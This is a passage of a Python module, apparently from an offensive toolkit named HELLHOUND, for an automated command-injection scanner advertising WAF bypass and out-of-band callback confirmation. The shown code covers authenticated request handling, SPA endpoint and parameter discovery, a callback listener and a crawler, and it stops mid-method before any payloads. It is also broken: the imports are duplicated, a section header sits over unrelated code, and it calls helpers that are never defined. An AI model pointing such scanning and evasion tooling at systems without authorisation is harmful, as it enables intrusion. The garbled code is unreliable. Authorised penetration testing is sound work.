#!/usr/bin/env python3
"""
hellhound/modules/vuln/CMDinj.py

HELLHOUND — Command Injection Scanner
Autonomous 5-tier pipeline: direct output → time-blind → output redirect → OOB → adaptive bypass
SPA-aware | WAF detection | Dual-OS | Self-hosted OOB | Verified PoC

Framework module — do not run directly.
"""

import json
import random
import re
import ssl
import string
import sys
import time
import threading
import urllib.parse
import urllib.request
import urllib.error
import http.server
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from html.parser import HTMLParser

# ══════════════════════════════════════════════════════════════════════
# METADATA
# ══════════════════════════════════════════════════════════════════════

NAME        = "CMDinj"
CATEGORY    = "vuln"
VERSION     = "5.7.0"
DESCRIPTION = "Advanced Command Injection Scanner (Smart Filtering + WAF Bypass)"

# ══════════════════════════════════════════════════════════════════════
# OPTIONS
# ══════════════════════════════════════════════════════════════════════

OPTIONS = [
    {"name": "cookie",        "type": str,   "default": None,    "required": False,
     "help": "Session cookie or auth token"},
    {"name": "timeout",       "type": int,   "default": 15,      "required": False,
     "help": "HTTP timeout per request (seconds)"},
    {"name": "time_thresh",   "type": float, "default": 9.0,     "required": False,
     "help": "Min delay to confirm time-based blind injection (seconds)"},
    {"name": "force_os",      "type": str,   "default": None,    "required": False,
     "help": "Force OS type: linux or windows"},
    {"name": "collab",        "type": str,   "default": None,    "required": False,
     "help": "OOB collaborator URL (e.g. interactsh)"},
    {"name": "delay",         "type": float, "default": 0.0,     "required": False,
     "help": "Min seconds between requests (auto-increases on WAF detection)"},
    {"name": "verbose",       "type": bool,  "default": False,   "required": False,
     "help": "Show payload attempts, tier transitions, verify results"},
    {"name": "proxy",         "type": str,   "default": None,    "required": False,
     "help": "HTTP proxy URL (e.g. http://127.0.0.1:8080)"},
    {"name": "output_dir",    "type": str,   "default": None,    "required": False,
     "help": "Web-accessible dir for output-redirect payloads (Tier 3)"},
    {"name": "read_path",     "type": str,   "default": None,    "required": False,
     "help": "URL path to read redirected output"},
    {"name": "header",        "type": str,   "default": None,    "required": False,
     "help": "Extra header for all requests e.g. 'X-API-Key: abc123'"},
    {"name": "login_url",     "type": str,   "default": None,    "required": False,
     "help": "Login form URL for pre-scan authentication"},
    {"name": "login_user",    "type": str,   "default": None,    "required": False,
     "help": "Username for login form"},
    {"name": "login_pass",    "type": str,   "default": None,    "required": False,
     "help": "Password for login form"},
]

# ══════════════════════════════════════════════════════════════════════
# GLOBAL VERBOSE (set by run() from options)
# ══════════════════════════════════════════════════════════════════════


VERBOSE = False

import http.server
import json
import random
import re
import ssl
import string
import sys
import time
import threading
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from html.parser import HTMLParser

# ─────────────────────────────────────────────────────────────────────────────
# ANSI COLORS
# ─────────────────────────────────────────────────────────────────────────────
def make_token():
    return "HHD" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
_ZP_PROBE_SENTINEL = "hh_zp_test"

# ─────────────────────────────────────────────────────────────────────────────
# VERBOSE MODE
# ─────────────────────────────────────────────────────────────────────────────

def vprint(*args, **kwargs):
    """Print only when verbose mode is active."""
    if VERBOSE:
        print(*args, **kwargs)

class HTTPClient:
    # ── Inst 1: Session Management ────────────────────────────────────────────
    # Three session modes:
    #   (a) raw cookie string / Authorization header  → --cookie flag
    #   (b) extra header key-value pair               → --header flag
    #   (c) login form credentials                    → --login-url/--login-user/
    #                                                   --login-pass/--login-user-field/
    #                                                   --login-pass-field flags
    # All three set self.headers so every component (crawler, prober, injector)
    # automatically operates as the authenticated user.
    # If a response returns 401/403 or redirects to a login-page pattern,
    # re_auth() is called to re-authenticate and the request is retried once.
    def __init__(self, timeout=12, cookie=None, extra_header=None,
                 login_url=None, login_user_field="username",
                 login_pass_field="password",
                 login_user=None, login_pass=None):
        self.timeout = timeout
        self._login_url        = login_url
        self._login_user_field = login_user_field
        self._login_pass_field = login_pass_field
        self._login_user       = login_user
        self._login_pass       = login_pass
        self._login_patterns   = re.compile(
            r'/login|/signin|/auth|/account/login|session.*expired|please.*log.*in',
            re.I)

        self.headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
            "Accept": "text/html,application/xhtml+xml,application/json,*/*;q=0.9",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "close",
        }
        # Mode (a): cookie / Authorization header
        if cookie:
            cookie = cookie.strip()
            if cookie.lower().startswith("cookie:"):
                cookie = cookie[len("cookie:"):].strip()
            if cookie.lower().startswith("authorization:"):
                cookie = cookie[len("authorization:"):].strip()
            if re.match(r"(?:Bearer|Basic|Token)\s+\S", cookie, re.I):
                self.headers["Authorization"] = cookie
            else:
                self.headers["Cookie"] = cookie
        # Mode (b): arbitrary extra header (key: value or key=value)
        if extra_header:
            if ":" in extra_header:
                k, v = extra_header.split(":", 1)
            elif "=" in extra_header:
                k, v = extra_header.split("=", 1)
            else:
                k, v = extra_header, ""
            self.headers[k.strip()] = v.strip()
        # Mode (c): perform login and capture session cookie
        if login_url and login_user and login_pass:
            self._do_login()

    def _do_login(self):
        """POST credentials to login_url, extract Set-Cookie and store."""
        data = {
            self._login_user_field: self._login_user,
            self._login_pass_field: self._login_pass,
        }
        resp = self.post(self._login_url, data)
        # Extract cookie from response headers
        _sc = resp.get("headers", {}).get("set-cookie", "")
        if _sc:
            # Take only the name=value pairs (drop attributes like Path, HttpOnly)
            _pairs = []
            for part in _sc.split(","):
                frag = part.strip().split(";")[0].strip()
                if "=" in frag and not any(
                    frag.lower().startswith(k)
                    for k in ("path=", "domain=", "expires=", "max-age=",
                               "samesite=", "secure", "httponly")
                ):
                    _pairs.append(frag)
            if _pairs:
                self.headers["Cookie"] = "; ".join(_pairs)
                tprint(f"  {ok(f'Login: session captured — {len(_pairs)} cookie pair(s)')}")
                return
        tprint(f"  {warn('Login: no Set-Cookie in response — session may not be authenticated')}")

    def re_auth(self):
        """Re-authenticate using stored credentials. Called on 401/403."""
        if self._login_url and self._login_user and self._login_pass:
            tprint(f"  {warn('Session expired — re-authenticating...')}")
            self._do_login()
            return True
        return False

    def _is_auth_redirect(self, resp):
        """Return True if the response is a redirect to a login page."""
        loc = resp.get("headers", {}).get("location", "")
        body = resp.get("body", "") or ""
        return bool(
            (loc and self._login_patterns.search(loc)) or
            (resp.get("status") in (401, 403)) or
            (resp.get("status", 0) in range(300, 310) and self._login_patterns.search(loc)) or
            (self._login_patterns.search(body[:500]))
        )

    def get(self, url, params=None):
        if params:
            qs = urllib.parse.urlencode(params, quote_via=urllib.parse.quote)
            url = url + ("&" if "?" in url else "?") + qs
        resp = self._do(url, None, "GET", self.headers)
        if self._is_auth_redirect(resp) and self.re_auth():
            resp = self._do(url, None, "GET", self.headers)
        return resp

    def post(self, url, data=None, content_type=None):
        """Send POST. content_type: None/'form'/'json'. None → form-encoded."""
        if data:
            if content_type == "json":
                import json as _j
                body = _j.dumps(data).encode()
                hdrs = {**self.headers, "Content-Type": "application/json"}
            else:
                body = urllib.parse.urlencode(data).encode()
                hdrs = {**self.headers, "Content-Type": "application/x-www-form-urlencoded"}
        else:
            body, hdrs = None, self.headers
        resp = self._do(url, body, "POST", hdrs)
        if self._is_auth_redirect(resp) and self.re_auth():
            resp = self._do(url, body, "POST", hdrs)
        return resp

    def post_json(self, url, payload_dict):
        """POST a JSON body. Used by injector for JSON-content-type endpoints."""
        return self.post(url, payload_dict, content_type="json")

    def get_raw(self, url):
        """Fetch raw content (for JS files)."""
        return self._do(url, None, "GET", self.headers)

    def _do(self, url, body, method, hdrs):
        # Inst 7: WAF stealth delay — applied per-request when WAF detected
        _delay = getattr(self, '_waf_delay', 0)
        if _delay:
            time.sleep(_delay)
        req = urllib.request.Request(url, data=body, headers=hdrs, method=method)
        t0 = time.time()
        try:
            with urllib.request.urlopen(req, timeout=self.timeout, context=_SSL_CTX) as r:
                elapsed = time.time() - t0
                text = r.read(512 * 1024).decode("utf-8", errors="replace")
                return {"ok": True, "status": r.status, "body": text,
                        "elapsed": elapsed, "url": url,
                        "headers": dict(r.headers), "error": None}
        except urllib.error.HTTPError as e:
            elapsed = time.time() - t0
            try: text = e.read(256 * 1024).decode("utf-8", errors="replace")
            except Exception: text = ""
            return {"ok": False, "status": e.code, "body": text,
                    "elapsed": elapsed, "url": url, "headers": {}, "error": str(e)}
        except Exception as ex:
            elapsed = time.time() - t0
            return {"ok": False, "status": 0, "body": "",
                    "elapsed": elapsed, "url": url, "headers": {}, "error": str(ex)}

# ─────────────────────────────────────────────────────────────────────────────
# JS / SPA ENDPOINT EXTRACTOR
# ─────────────────────────────────────────────────────────────────────────────
class JSExtractor:
    _REST = [
        re.compile(r'axios\.(get|post|put|delete|patch)\s*\(\s*["\`]([^"\`\n]{3,80})["\`]', re.I),
        re.compile(r'fetch\s*\(\s*["\`]([^"\`\n]{3,80})["\`]', re.I),
        re.compile(r'\$\.(get|post|ajax)\s*\(\s*["\`]([^"\`\n]{3,80})["\`]', re.I),
        re.compile(r'(?:this\.|self\.)?(?:http|api)\.(get|post|put|delete|patch)\s*\(\s*["\`]([^"\`\n]{3,80})["\`]', re.I),
        re.compile(r'XMLHttpRequest[^;]{0,200}\.open\s*\(\s*["\']([A-Z]+)["\']\s*,\s*["\']([^"\']{3,80})["\']', re.I),
        re.compile(r'["\`](/(?:api|v\d+|rest|graphql|admin|auth|user|account|search|upload|ws)[a-zA-Z0-9_\-\./]*)["\`]', re.I),
    ]
    _TEMPLATE = re.compile(r'`(/[^`\n]{3,80})`')
    _ROUTER = re.compile(r'(?:router|app|Route)\s*\.\s*(get|post|put|delete|patch|use)\s*\(\s*["\']([^"\']{2,60})["\']', re.I)
    _QS = re.compile(r'[?&]([a-zA-Z_][a-zA-Z0-9_]{1,30})=', re.I)
    _BODY = re.compile(r'JSON\.stringify\s*\(\s*\{([^}]{3,300})\}', re.DOTALL)
    _KEY_IN_OBJ = re.compile(r'["\']?([a-zA-Z_][a-zA-Z0-9_]{1,30})["\']?\s*:', re.I)
    _WS = re.compile(r'new\s+WebSocket\s*\(\s*["\`]([^"\`\n]{3,80})["\`]', re.I)

    _NOISE = re.compile(
        r'\.(css|js|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|map|min\.js|webp|bmp|tiff|avif)$'
        r'|^/static/|^/assets/|^/images/|^/fonts/|^/dist/'
        r'|^/img/|^/image/|^/images/|^/avatar/|^/avatars/'
        r'|^/media/|^/thumb/|^/thumbnails/|^/upload/|^/uploads/'
        r'|^/cdn/|^/files/|^/public/|^/res/|^/resources/'
        r'|^/favicon|^/icons/|^/photo/|^/photos/', re.I
    )
    _JS_KW = {'function','return','var','let','const','if','else','for','while',
               'switch','case','break','continue','typeof','instanceof','import',
               'export','class','extends','new','this','super','null','undefined',
               'true','false','try','catch','finally','throw','async','await'}

    def _valid_path(self, p):
        if not p or not isinstance(p, str): return False
        p = p.split("?")[0].split("#")[0]
        if not p.startswith("/"): return False
        if len(p) < 2 or len(p) > 120: return False
        if self._NOISE.search(p): return False
        segs = [s for s in p.split("/") if s]
        if not segs: return False
        return True

    def _norm(self, p):
        p = p.split("#")[0].split("?")[0]
        p = re.sub(r'/\d+', '/{id}', p)
        p = re.sub(r'/[0-9a-f]{8,}', '/{id}', p, flags=re.I)
        p = re.sub(r'\$\{[^}]+\}', '{var}', p)
        p = re.sub(r'//+', '/', p)
        return p.rstrip("/") or "/"

    def extract(self, js_content, base_url=""):
        results = {}

        def add(path, method, params, source):
            if not self._valid_path(path): return
            norm = self._norm(path)
            if norm in results:
                existing = results[norm]
                if existing["method"] == "GET" and method != "GET":
                    existing["method"] = method
                existing["params"] = sorted(set(existing["params"] + params))
            else:
                results[norm] = {
                    "path": norm,
                    "method": method.upper(),
                    "params": params,
                    "source": source,
                    "base_url": base_url,
                }

        for pat in self._REST:
            for m in pat.finditer(js_content):
                groups = m.groups()
                if len(groups) == 1:
                    path, method = groups[0], "GET"
                else:
                    a, b = groups[0], groups[1]
                    if a.upper() in ("GET","POST","PUT","DELETE","PATCH"):
                        method, path = a.upper(), b
                    elif b.upper() in ("GET","POST","PUT","DELETE","PATCH"):
                        method, path = b.upper(), a
                    else:
                        path, method = a, "GET"
                qs_params = self._QS.findall(path)
                add(path.split("?")[0], method, qs_params, "js_rest")

        for m in self._ROUTER.finditer(js_content):
            method, path = m.group(1), m.group(2)
            if method.lower() == "use": method = "GET"
            add(path, method, [], "js_router")

        for m in self._TEMPLATE.finditer(js_content):
            path = m.group(1)
            if any(kw in path for kw in ["api", "v1", "v2", "rest", "graphql", "admin", "auth"]):
                add(path.split("?")[0], "GET", [], "js_template")

        body_params = set()
        for m in self._BODY.finditer(js_content):
            for k in self._KEY_IN_OBJ.findall(m.group(1)):
                if k.lower() not in self._JS_KW and len(k) > 1:
                    body_params.add(k)

        for info_item in results.values():
            if info_item["method"] in ("POST", "PUT", "PATCH") and body_params:
                info_item["params"] = sorted(set(info_item["params"]) | body_params)

        ws = [m.group(1) for m in self._WS.finditer(js_content)]
        return list(results.values()), ws

# ─────────────────────────────────────────────────────────────────────────────
# HTML PARSER
# ─────────────────────────────────────────────────────────────────────────────
class PageParser(HTMLParser):
    def __init__(self, base_url):
        super().__init__()
        self.base_url = base_url
        self._base = urllib.parse.urlparse(base_url)
        self.links = set()
        self.js_links = set()
        self.forms = []
        self._form = None

    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == "a":
            href = (a.get("href") or "").strip()
            if href and not href.startswith(("javascript:", "mailto:", "#", "tel:", "data:")):
                full = urllib.parse.urljoin(self.base_url, href)
                if urllib.parse.urlparse(full).netloc == self._base.netloc:
                    self.links.add(full)

        elif tag == "script":
            src = (a.get("src") or "").strip()
            if src:
                full = urllib.parse.urljoin(self.base_url, src)
                if urllib.parse.urlparse(full).netloc == self._base.netloc:
                    self.js_links.add(full)

        elif tag == "form":
            self._form = {
                "action": urllib.parse.urljoin(self.base_url, a.get("action", self.base_url)),
                "method": a.get("method", "GET").upper(),
                "inputs": [],
            }

        elif tag in ("input", "textarea", "select") and self._form is not None:
            name = a.get("name") or a.get("id")
            itype = a.get("type", "text").lower()
            if name and itype not in ("submit", "button", "reset", "image", "file"):
                self._form["inputs"].append({
                    "name": name, "type": itype,
                    "value": a.get("value", "test"),
                })

    def handle_endtag(self, tag):
        if tag == "form" and self._form:
            testable = [i for i in self._form["inputs"] if i["type"] != "hidden"]
            if testable:
                self.forms.append(self._form)
            self._form = None

# ─────────────────────────────────────────────────────────────────────────────
# SPA PARAMETER PROBER
# ─────────────────────────────────────────────────────────────────────────────
class SPAProber:
    _ERR_PATTERNS = [
        re.compile(r'(?:missing|required|mandatory)\s+(?:field|param(?:eter)?|key|argument)[s]?[\s:,]+([a-zA-Z_][a-zA-Z0-9_]{1,40})', re.I),
        re.compile(r'(?:missing|required)\s+(?:fields?|params?)[:\s]+([a-zA-Z_][a-zA-Z0-9_]{0,40}(?:[,\s]+[a-zA-Z_][a-zA-Z0-9_]{0,40})*)', re.I),
        re.compile(r'["\'\']([a-zA-Z_][a-zA-Z0-9_]{1,40})["\'\'][\s]+(?:is\s+)?(?:required|missing|mandatory)', re.I),
        re.compile(r'param(?:eter)?[\s]+[\'"]?([a-zA-Z_][a-zA-Z0-9_]{1,40})[\'"]?', re.I),
        re.compile(r'field[\s]+[\'"]?([a-zA-Z_][a-zA-Z0-9_]{1,40})[\'"]?', re.I),
        re.compile(r'[A-Z][a-z]+\.([a-zA-Z_][a-zA-Z0-9_]{1,40})\s+cannot\s+be\s+null', re.I),
        re.compile(r'["\'\'](?:body|query|params)\.([a-zA-Z_][a-zA-Z0-9_]{1,40})["\'\']', re.I),
        re.compile(r'"param"\s*:\s*"([a-zA-Z_][a-zA-Z0-9_]{1,40})"', re.I),
        re.compile(r'(?:unknown|unexpected|invalid|unrecognized)\s+(?:field|param|key|argument)[\s:]+([a-zA-Z_][a-zA-Z0-9_]{1,40})', re.I),
        re.compile(r'(?:error|message|detail)["\'\']?:\s*["\'\'][^"\']{0,30}:\s*([a-zA-Z_][a-zA-Z0-9_]{1,40})["\'\']', re.I),
    ]

    _UNIVERSAL = [
        "cmd", "command", "exec", "execute", "run", "shell", "ping", "host",
        "ip", "addr", "address", "target", "dest", "destination",
        "file", "path", "dir", "folder", "filename", "filepath",
        "url", "uri", "src", "source", "input", "arg", "args",
        "q", "query", "search", "keyword", "filter", "id", "pid", "uid",
        "user", "username", "email", "name", "type", "action", "method",
        "data", "value", "param", "key", "token", "code", "ref", "lang",
        "page", "limit", "offset", "sort", "order", "format", "output",
        "callback", "redirect", "return", "next", "from", "to",
    ]

    _PATH_HINTS = {
        "track":     ["orderId", "trackingNumber", "order", "id"],
        "order":     ["orderId", "id", "userId"],
        "search":    ["q", "query", "keyword", "search"],
        "product":   ["id", "pid", "name", "category"],
        "user":      ["userId", "id", "email", "username"],
        "login":     ["email", "username", "password"],
        "reset":     ["email", "token", "password"],
        "apply":     ["code", "key", "token"],
        "chatbot":   ["query", "message", "msg"],
        "memories":  ["id", "caption", "image"],
        "admin":     ["command", "action", "key"],
        "web3":      ["address", "wallet", "contract"],
        "coupon":    ["coupon", "code", "discount"],
        "country":   ["country", "code", "mapping"],
        "deluxe":    ["token", "membership"],
        "captcha":   ["answer", "captchaId", "solution"],
        "feedback":  ["comment", "rating", "message"],
        "complaint": ["message", "file", "fileUpload"],
        "recycle":   ["quantity", "address", "isPickup"],
        "delivery":  ["deliveryMethodId", "name"],
    }

    _API_CT = re.compile(r'application/json|text/json|application/javascript', re.I)

    def __init__(self, client, base_url, threads=8):
        self.client   = client
        self.base_url = base_url
        self.threads  = threads
        self._lock    = threading.Lock()

    def _is_api_response(self, resp):
        ct = resp.get("headers", {}).get("content-type", "")
        body = resp.get("body", "")
        if self._API_CT.search(ct):
            return True
        stripped = body.strip()
        return stripped.startswith("{") or stripped.startswith("[")

    def _extract_params_from_error(self, body):
        found = set()
        for pat in self._ERR_PATTERNS:
            for m in pat.finditer(body):
                name = m.group(1).strip()
                if (len(name) >= 1 and len(name) <= 40
                        and not name[0].isdigit()
                        and name.lower() not in {
                            "error", "message", "status", "code", "true", "false",
                            "null", "undefined", "object", "string", "number",
                            "boolean", "array", "function", "required", "missing",
                        }):
                    found.add(name)
        return found

    def _path_hints(self, url):
        segs = urllib.parse.urlparse(url).path.lower().split("/")
        hints = []
        for seg in segs:
            seg = seg.strip("-_")
            for keyword, params in self._PATH_HINTS.items():
                if keyword in seg:
                    hints.extend(params)
        return list(dict.fromkeys(hints))

    def _probe_url(self, url, method):
        if method == "GET":
            return self.client.get(url)
        else:
            return self.client.post(url, {})

    def _detect_methods(self, url):
        accepted = []
        for m in ("GET", "POST", "PUT"):
            r = self._probe_url(url, m)
            if r["status"] not in (405, 0):
                accepted.append((m, r))
        return accepted if accepted else [("GET", self._probe_url(url, "GET"))]

    def _harvest_params_iterative(self, url, method, candidates):
        known  = set()
        dummy  = {p: "test" for p in candidates}
        rounds = 0
        while rounds < 3:
            rounds += 1
            if method == "GET":
                r = self.client.get(url, dummy)
            else:
                r = self.client.post(url, dummy)
            new_found = self._extract_params_from_error(r.get("body", ""))
            new_needed = new_found - set(dummy.keys())
            if not new_needed:
                break
            for p in new_needed:
                dummy[p] = "test"
                known.add(p)
        return known

    def probe(self, discovered_urls):
        if not discovered_urls:
            return []

        tprint(f"\n  {color('─'*68, C.DIM + C.CYAN)}")
        tprint(f"  {color('─'*68, C.DIM + C.CYAN)}")
        tprint(f"  {info(f'Probing {len(discovered_urls)} API endpoints for parameter discovery...')}\n")

        results = []

        def probe_one(url):
            ep_params    = {}
            error_params = set()
            endpoints_out = []

            get_bare  = self.client.get(url)
            post_bare = self.client.post(url, {})

            has_get  = get_bare["status"]  not in (405, 0)
            has_post = post_bare["status"] not in (405, 0)

            if not has_get and not has_post:
                return []

            malformed_probes = [
                {},
                {"__probe__": None},
                {"__probe__": ""},
                {"id": "not-a-number", "name": ""},
                {"query": None, "cmd": None},
            ]
            for probe_body in malformed_probes:
                for method in (["POST"] if has_post else []) + (["GET"] if has_get else []):
                    if method == "POST":
                        r = self.client.post(url, probe_body)
                    else:
                        r = self.client.get(url, probe_body if probe_body else None)
                    if self._is_api_response(r):
                        found = self._extract_params_from_error(r.get("body", ""))
                        error_params.update(found)
                        ep_params.update({p: "test" for p in found})

            hints = self._path_hints(url)
            ep_params.update({p: "test" for p in hints if p not in ep_params})

            all_candidates = list(ep_params.keys()) + self._UNIVERSAL
            for method in (["POST"] if has_post else []) + (["GET"] if has_get else []):
                harvested = self._harvest_params_iterative(url, method, all_candidates)
                ep_params.update({p: "test" for p in harvested})
                error_params.update(harvested)

            if not ep_params:
                ep_params = {p: "test" for p in self._UNIVERSAL[:14]}

            if not ep_params:
                return []

            from_err = bool(error_params)

            if has_post:
                endpoints_out.append({
                    "url":          url,
                    "method":       "POST",
                    "params":       dict(ep_params),
                    "hidden":       {},
                    "source":       "spa_probe",
                    "_from_error":  from_err,
                })
            if has_get:
                endpoints_out.append({
                    "url":          url,
                    "method":       "GET",
                    "params":       dict(ep_params),
                    "hidden":       {},
                    "source":       "spa_probe_get",
                    "_from_error":  from_err,
                })

            return endpoints_out

        with ThreadPoolExecutor(max_workers=self.threads) as pool:
            futures = {pool.submit(probe_one, url): url for url in discovered_urls}
            for fut in as_completed(futures):
                try:
                    ep_list = fut.result()
                    if ep_list:
                        with self._lock:
                            results.extend(ep_list)
                except Exception:
                    pass

        seen = set()
        deduped = []
        for r in results:
            key = (r["url"], r["method"])
            if key not in seen:
                seen.add(key)
                deduped.append(r)
        results = deduped

        real_params = sum(1 for r in results if r.get("_from_error"))
        tprint(f"  {ok(f'SPA probing complete — {len(results)} endpoints ({real_params} with server-confirmed params)')}")
        return results


# ─────────────────────────────────────────────────────────────────────────────
# SELF-HOSTED OOB LISTENER
# Starts a background HTTP listener on a random port (8000-9000).
# Records every incoming GET/POST request path+query in a thread-safe list.
# After each OOB payload, poll for 8-12s for a matching request containing
# the scan token. Returns confirmed blind execution without --collab.
# ─────────────────────────────────────────────────────────────────────────────
class _OOBHandler(http.server.BaseHTTPRequestHandler):
    """Minimal HTTP handler — records path+query, never responds with error."""
    def do_GET(self):
        self.server._oob_hits.append(self.path)
        self.send_response(200)
        self.end_headers()
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode(errors="replace") if length else ""
        self.server._oob_hits.append(self.path + "?" + body)
        self.send_response(200)
        self.end_headers()
    def log_message(self, *args):
        pass  # suppress access log noise

class SelfHostedOOBServer:
    """
    Daemon HTTP listener for OOB callback detection.
    Usage:
        srv = SelfHostedOOBServer()
        host, port = srv.start()
        # fire OOB payloads targeting http://host:port/?t=TOKEN&d=...
        hit, path = srv.poll(token, timeout=10)
        srv.stop()
    """
    def __init__(self):
        self._server = None
        self._thread = None
        self.host    = None
        self.port    = None

    def start(self):
        """Bind to a random port in 8000-9000 and start daemon thread."""
        import random
        tried = 0
        for _ in range(50):
            port = random.randint(8000, 9000)
            try:
                srv = http.server.HTTPServer(("0.0.0.0", port), _OOBHandler)
                srv._oob_hits = []          # thread-safe list (GIL protects list.append)
                self._server = srv
                self.port    = port
                break
            except OSError:
                tried += 1
                continue
        if not self._server:
            return None, None
        # Resolve outbound IP — what the target will actually reach
        try:
            import socket as _s
            with _s.socket(_s.AF_INET, _s.SOCK_DGRAM) as sock:
                sock.connect(("8.8.8.8", 80))
                self.host = sock.getsockname()[0]
        except Exception:
            self.host = "127.0.0.1"
        self._thread = threading.Thread(
            target=self._server.serve_forever,
            daemon=True,
            name="hellhound-oob-listener"
        )
        self._thread.start()
        return self.host, self.port

    def poll(self, token, timeout=10):
        """
        Poll for a request containing `token` in path or query string.
        Returns (True, matching_path) if found within timeout, else (False, "").
        Poll interval: 0.5s.
        """
        import time as _t
        deadline = _t.time() + timeout
        tok_lower = token.lower()
        while _t.time() < deadline:
            if self._server:
                for hit in list(self._server._oob_hits):
                    if tok_lower in hit.lower():
                        return True, hit
            _t.sleep(0.5)
        return False, ""

    def stop(self):
        """Shutdown the listener cleanly."""
        if self._server:
            self._server.shutdown()
            self._server = None

# ─────────────────────────────────────────────────────────────────────────────
# THREADED CRAWLER  (HTML + JS/SPA)
# ─────────────────────────────────────────────────────────────────────────────
class Crawler:
    def __init__(self, base_url, client, max_pages=60, max_depth=3, threads=10):
        self.base = base_url
        self._base_parsed = urllib.parse.urlparse(base_url)
        self.client = client
        self.max_pages = max_pages
        self.max_depth = max_depth
        self.threads = threads
        self._visited_lock = threading.Lock()
        self._ep_lock = threading.Lock()
        self.visited = set()
        self.js_visited = set()
        # Maps (url, method, param) → frozenset of shell chars known to survive
        # the sanitization filter on that endpoint.  Populated by
        # _detect_sanitization_endpoints and consumed by _run_adaptive_tier.
        self._survived_chars: dict = {}
        self.endpoints = []
        self._js_extractor = JSExtractor()
        self._spa_endpoint_count = 0
        # Body cache: stores page/JS bodies already fetched during crawl.
        # _extract_obfuscated_api_paths reads from this instead of re-fetching.
        self._body_cache: dict = {}  # url -> body str
        self._json_response_cache: dict = {}  # url -> JSON body str (chained discovery)

    def _same_domain(self, url):
        return urllib.parse.urlparse(url).netloc == self._base_parsed.netloc

    def _normalize(self, url):
        p = urllib.parse.urlparse(url)
        return urllib.parse.urlunparse((p.scheme, p.netloc, p.path, p.params, p.query, ""))

    @staticmethod
    def _norm_url(url):
        """
        Normalise a URL path for dedup purposes.
        ONLY collapses a segment to {id} when it is:
          - purely numeric            /items/42           → /items/{id}
          - a standard UUID           /item/550e8400-...  → /item/{id}
        Segments containing letters are NEVER collapsed — they are named routes
        (/api/g9x6tl, /api/v8k3nf) that refer to different resources, not
        parameterised instances of the same route.
        """
        import urllib.parse as _up
        p = _up.urlparse(url)
        _UUID_RE = re.compile(
            r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', re.I)
        def _is_id(seg):
            # Only pure integers and UUIDs are positional IDs.
            # Any segment with a letter is a distinct named resource — keep as-is.
            return seg.isdigit() or bool(_UUID_RE.match(seg))
        segs = p.path.split("/")
        normed = "/".join("{id}" if _is_id(s) else s for s in segs)
        return normed

    def _add_endpoint(self, url, method, params, hidden, source,
                      priority_params=None, response_sig=None, discovered_via=None):
        if not params and not priority_params:
            return
        with self._ep_lock:
            # Dedup key: normalized URL + method.
            # BUT: if both the incoming entry and the existing entry carry
            # distinct response_sigs, they are different API routes that
            # happen to share a normalized URL pattern — do NOT merge them.
            # Only merge when at least one sig is absent (unknown shape) or
            # both sigs match (same endpoint template, same response shape).
            _nurl = Crawler._norm_url(url)
            existing = next(
                (e for e in self.endpoints
                 if Crawler._norm_url(e["url"]) == _nurl
                 and e["method"] == method),
                None
            )
            # Sig conflict → treat as distinct route, skip merge
            if (existing is not None
                    and response_sig is not None
                    and existing.get("response_sig") is not None
                    and response_sig != existing["response_sig"]):
                existing = None  # force new entry with real URL
            if existing is None:
                self.endpoints.append({
                    "url": url, "method": method,
                    "params": dict(params) if params else {},
                    "hidden": hidden or {},
                    "source": source,
                    # priority_params: JSON-derived high-confidence names.
                    # test_endpoint drains these BEFORE params.
                    "priority_params": list(priority_params) if priority_params else [],
                    "response_sig": response_sig,
                    "discovered_via": discovered_via,
                })
            else:
                # Merge params: additive update, capped at 20 per endpoint.
                # Above cap: only admit high-risk names (risk_score >= 2).
                _CAP = 20
                current = existing["params"]
                for pname, pval in (params or {}).items():
                    if pname in current:
                        continue
                    if len(current) < _CAP:
                        current[pname] = pval
                    elif risk_score(pname) >= 2:
                        lowest = min(
                            (k for k in current if risk_score(k) < 2),
                            key=lambda k: risk_score(k),
                            default=None
                        )
                        if lowest is not None:
                            del current[lowest]
                            current[pname] = pval
                # Merge priority_params: extend, dedup preserving order
                if priority_params:
                    pp = existing.setdefault("priority_params", [])
                    existing_set = set(pp) | set(current)
                    for pname in priority_params:
                        if pname not in existing_set:
                            pp.append(pname)
                            existing_set.add(pname)
                # Merge hidden params too
                if hidden:
                    existing.setdefault("hidden", {}).update(hidden)
                # Backfill response_sig if previously unknown
                if response_sig and not existing.get("response_sig"):
                    existing["response_sig"] = response_sig

    def _process_js(self, js_url):
        with self._visited_lock:
            if js_url in self.js_visited:
                return []
            self.js_visited.add(js_url)

        resp = self.client.get_raw(js_url)
        if not resp["ok"] or resp["status"] == 0:
            return []

        # Cache JS body for obfuscated-path scanning
        if resp.get("body"):
            with self._ep_lock:
                self._body_cache[js_url] = resp["body"]

        endpoints, ws = self._js_extractor.extract(resp["body"], self.base)
        new_links = []

        for ep in endpoints:
            path = ep["path"]
            if path.startswith("http"):
                full_url = path
            else:
                full_url = urllib.parse.urljoin(self.base, path)

            if not self._same_domain(full_url):
                continue

            if ep["params"]:
                params = {p: "test" for p in ep["params"]}
                self._add_endpoint(full_url, ep["method"], params, {}, f"js:{js_url[-40:]}")
                with self._ep_lock:
                    self._spa_endpoint_count += 1
                _m = ep["method"]; _p = path[:60]; _pc = len(ep["params"]); _js = js_url[-35:]
                tprint(f"  {js_ep(f'{_m} {_p} [{_pc} params] ← {_js}')}")
            else:
                norm = self._normalize(full_url)
                with self._visited_lock:
                    if norm not in self.visited and len(self.visited) < self.max_pages:
                        self.visited.add(norm)
                        new_links.append((full_url, 1))

        return new_links

    def _process_page(self, url, depth):
        resp = self.client.get(url)
        status = resp["status"]
        with self._visited_lock:
            n = len(self.visited)
        sys.stdout.write(f"\r  {color(f'  crawling... {n} pages found', C.DIM)}  ")
        sys.stdout.flush()

        if status == 0:
            return []

        # Cache body for obfuscated-path scanning — avoids re-fetching all pages
        if resp.get("body"):
            with self._ep_lock:
                self._body_cache[url] = resp["body"]

